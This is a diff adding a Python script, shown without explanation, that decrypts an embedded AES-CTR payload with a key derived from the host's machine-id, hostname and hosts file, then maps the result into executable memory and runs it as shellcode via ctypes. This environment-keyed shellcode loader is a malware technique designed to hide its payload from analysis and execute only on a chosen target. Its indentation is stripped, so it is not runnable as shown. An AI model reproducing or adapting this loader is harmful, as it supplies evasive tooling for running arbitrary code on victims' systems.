@@ -1,0 +1,46 @@
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+import os
+import ctypes
+import mmap
+encrypted_data_hex = 'a6dd43878802d632394cbd3b03a0a757724086f9e5c1467421aa52
+8e03d02d8e50c6b6bef1cc559accffcf05546603ded8f348e01f031e483086b8ae408db92e89'
+filez = ['/etc/machine-id', '/etc/hostname', '/etc/hosts'] # itd.
+def readFile(path):
+try:
+with open(path, 'r') as file:
+return file.read().strip()
+except Exception:
+return ''
+def generateKey():
+key_components = [readFile(path) for path in filez]
+concated_data = ''.join(key_components).encode('utf-8')
+digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
+digest.update(concated_data)
+return digest.finalize()
+def gatherInfoAndDecrypt(enc_payload, nonce):
+key = generateKey()
+backend = default_backend()
+cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=backend)
+decryptor = cipher.decryptor()
+decrypted = decryptor.update(enc_payload) + decryptor.finalize()
+try:
+return decrypted
+except UnicodeDecodeError:
+return f"Decrypted data (hex): {decrypted.hex()}"
+nonce_hex = '8b07b0b93a2bff1572b2549ceb8445bc'
+nonce = bytes.fromhex(nonce_hex)
+encrypted_data = bytes.fromhex(encrypted_data_hex)
+decrypted_data = gatherInfoAndDecrypt(encrypted_data, nonce)
+shellcode=decrypted_data
+em = mmap.mmap(-1, len(shellcode),
+prot = mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC,
+flags = mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE)
+em.write(shellcode)
+restype = ctypes.c_int64
+argtypes = tuple()
+ctypes_buffer = ctypes.c_byte.from_buffer(em)
+f = ctypes.CFUNCTYPE(restype, *argtypes)(ctypes.addressof(ctypes_buffer))
+f._avoid_gc_for_mmap=em
+f()
